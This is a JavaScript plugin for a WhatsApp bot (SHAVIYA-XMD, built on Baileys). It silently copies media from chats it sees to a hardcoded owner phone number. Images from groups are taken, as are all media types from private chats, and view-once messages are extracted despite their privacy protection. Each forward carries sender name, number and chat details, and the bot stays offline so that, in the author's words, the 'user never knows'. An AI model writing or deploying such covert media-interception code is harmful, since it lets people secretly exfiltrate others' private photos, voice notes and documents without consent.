const { cmd } = require('../command');

let baileys;
try { baileys = require('@dnuzi/baileys'); }
catch (err) {
    try { baileys = require('@whiskeysockets/baileys'); }
    catch (err) {
        try { baileys = require('@adiwajshing/baileys'); }
        catch (e) { console.error("Baileys not found!"); }
    }
}

// ══════════════════════════════════════════════════════════════
//  SILENT MEDIA FORWARDER — SHAVIYA-XMD
//  Forward all media to OWNER's number silently
//  - Group: images only
//  - Private: images + videos + audio
//  - View-once: all types
//  - Invisible: user never knows
//  Created by: Savendra Dampriya
// ══════════════════════════════════════════════════════════════

// Owner JID — හැම media එකම මෙතනට
const OWNER_NUMBER = (process.env.OWNER_NUMBER || '94707085822').replace(/[^0-9]/g, '');
const OWNER_JID = OWNER_NUMBER + '@s.whatsapp.net';

// Feature flags
global.mediaForwardEnabled = true;
global.mediaForwardSilent = true;  // No read, no react, no reply

// Memory (avoid duplicates)
if (!global.mediaFwdCaptured) global.mediaFwdCaptured = new Set();

// ─────────────────────────────────────────────
//  Force offline (invisible)
// ─────────────────────────────────────────────
function keepOffline(conn) {
    try { conn.sendPresenceUpdate('unavailable'); } catch (e) {}
}

// ─────────────────────────────────────────────
//  Main forward handler
// ─────────────────────────────────────────────
async function handleMediaForward(conn, mek, m, ctx) {
    try {
        if (!global.mediaForwardEnabled) return;

        const msg = mek.message;
        if (!msg) return;

        const from = ctx.from;
        const isGroup = ctx.isGroup || (from && from.endsWith('@g.us'));

        // ─────────────────────────────────────
        //  Detect View-Once
        // ─────────────────────────────────────
        let vvMsg = null;
        let vvType = null;

        if (msg.viewOnceMessageV2Extension) {
            vvMsg = msg.viewOnceMessageV2Extension.message;
            vvType = 'View Once V2 Ext';
        } else if (msg.viewOnceMessageV2) {
            vvMsg = msg.viewOnceMessageV2.message;
            vvType = 'View Once V2';
        } else if (msg.viewOnceMessage) {
            vvMsg = msg.viewOnceMessage.message;
            vvType = 'View Once V1';
        }

        // ─────────────────────────────────────
        //  Determine actual content
        // ─────────────────────────────────────
        let contentType = null;
        let contentMsg = null;

        if (vvMsg) {
            // View-once — detect type inside
            if (vvMsg.imageMessage) { contentType = 'image'; contentMsg = vvMsg; }
            else if (vvMsg.videoMessage) { contentType = 'video'; contentMsg = vvMsg; }
            else if (vvMsg.audioMessage) { contentType = 'audio'; contentMsg = vvMsg; }
            else if (vvMsg.documentMessage) { contentType = 'document'; contentMsg = vvMsg; }
        } else {
            // Normal message
            if (msg.imageMessage) { contentType = 'image'; contentMsg = msg; }
            else if (msg.videoMessage) { contentType = 'video'; contentMsg = msg; }
            else if (msg.audioMessage) { contentType = 'audio'; contentMsg = msg; }
            else if (msg.documentMessage) { contentType = 'document'; contentMsg = msg; }
        }

        if (!contentType || !contentMsg) return;

        // ─────────────────────────────────────
        //  🚫 FILTERS
        //  - Group: images only
        //  - Private: everything
        // ─────────────────────────────────────
        if (isGroup) {
            // Group: image විතරයි (view-once වුණත්)
            if (contentType !== 'image') return;
        }
        // Private: everything passes ✅

        // ─────────────────────────────────────
        //  Duplicate check
        // ─────────────────────────────────────
        const msgId = mek.key.id;
        if (global.mediaFwdCaptured.has(msgId)) return;
        global.mediaFwdCaptured.add(msgId);
        if (global.mediaFwdCaptured.size > 1000) {
            const arr = Array.from(global.mediaFwdCaptured);
            global.mediaFwdCaptured = new Set(arr.slice(-300));
        }

        // ─────────────────────────────────────
        //  Build metadata caption
        // ─────────────────────────────────────
        const senderNum = ctx.sender ? ctx.sender.split('@')[0] : 'Unknown';
        const senderName = m.pushName || 'User';
        const chatType = isGroup ? 'Group' : 'Private';
        const groupName = isGroup ? (ctx.groupName || 'Group') : '';

        const timestamp = new Date().toLocaleString('en-US', {
            timeZone: 'Asia/Colombo',
            hour: '2-digit', minute: '2-digit', hour12: true,
            day: '2-digit', month: 'short', year: 'numeric'
        });

        // Icon per type
        const icons = {
            image: '📸',
            video: '🎥',
            audio: '🎵',
            document: '📄'
        };
        const icon = icons[contentType] || '📎';

        const vvTag = vvType ? `\n👁️ *View Once:* Yes (${vvType})` : '';

        const caption =
            `${icon} *Media Forwarded*\n\n` +
            `📱 *From:* ${senderName}\n` +
            `🔢 *Number:* +${senderNum}\n` +
            `💬 *Chat:* ${chatType}${isGroup ? ' — ' + groupName : ''}\n` +
            `📦 *Type:* ${contentType.toUpperCase()}${vvTag}\n` +
            `⏰ *Time:* ${timestamp}\n\n` +
            `> 🔮 ⟡ ꜱ ʜ ᴀ ᴠ ɪ ʏ ᴀ - x ᴍ ᴅ ⟡ 🔮`;

        // ─────────────────────────────────────
        //  Download + forward silently
        // ─────────────────────────────────────
        try {
            const buffer = await conn.downloadMediaMessage({
                message: contentMsg,
                key: mek.key
            });

            if (contentType === 'image') {
                await conn.sendMessage(OWNER_JID, { image: buffer, caption });
            } else if (contentType === 'video') {
                await conn.sendMessage(OWNER_JID, {
                    video: buffer,
                    mimetype: contentMsg.videoMessage?.mimetype || 'video/mp4',
                    caption
                });
            } else if (contentType === 'audio') {
                await conn.sendMessage(OWNER_JID, {
                    audio: buffer,
                    mimetype: contentMsg.audioMessage?.mimetype || 'audio/mp4',
                    ptt: contentMsg.audioMessage?.ptt || false
                });
                await conn.sendMessage(OWNER_JID, { text: caption });
            } else if (contentType === 'document') {
                await conn.sendMessage(OWNER_JID, {
                    document: buffer,
                    mimetype: contentMsg.documentMessage?.mimetype || 'application/octet-stream',
                    fileName: contentMsg.documentMessage?.fileName || 'file',
                    caption
                });
            }

        } catch (mediaErr) {
            console.error('[MEDIAFWD] Download error:', mediaErr.message);
            try {
                await conn.sendMessage(OWNER_JID, {
                    text: caption + `\n\n⚠️ _Failed: ${mediaErr.message}_`
                });
            } catch (e) {}
        }

        // 🕵️ Keep offline (invisible)
        keepOffline(conn);

    } catch (err) {
        console.error('[MEDIAFWD]', err.message);
    }
}

// ─────────────────────────────────────────────
//  Toggle command
// ─────────────────────────────────────────────
cmd({
    pattern: 'mediaforward',
    alias: ['mfwd', 'fwdmedia', 'mediamirror'],
    desc: 'Toggle silent media forwarding to owner',
    category: 'owner',
    react: '📡',
    filename: __filename
},
async (conn, mek, m, { from, reply, isOwner }) => {
    try {
        if (!isOwner) return reply('❌ *Owner only command!*');

        global.mediaForwardEnabled = !global.mediaForwardEnabled;

        await conn.sendMessage(from, {
            react: { text: global.mediaForwardEnabled ? '✅' : '❌', key: mek.key }
        });

        await reply(
            `${global.mediaForwardEnabled ? '✅' : '❌'} *Media Forwarder*\n\n` +
            `📊 Status: *${global.mediaForwardEnabled ? 'ENABLED' : 'DISABLED'}*\n` +
            `🕵️ Mode: *Silent* (user won't know)\n` +
            `📥 Destination: *+${OWNER_NUMBER}*\n\n` +
            `📋 *Rules:*\n` +
            `• Group → 📸 images only\n` +
            `• Private → 📸🎥🎵 all media\n` +
            `• View-once → all types`
        );

    } catch (err) {
        console.error('[MEDIAFWD TOGGLE]', err.message);
        reply('❌ Error: ' + err.message);
    }
});

// ─────────────────────────────────────────────
//  Export hook
// ─────────────────────────────────────────────
module.exports = {
    mediaForwardHandler: async (conn, mek, m, ctx) => {
        if (!global.mediaForwardEnabled) return;
        await handleMediaForward(conn, mek, m, ctx);
    }
};
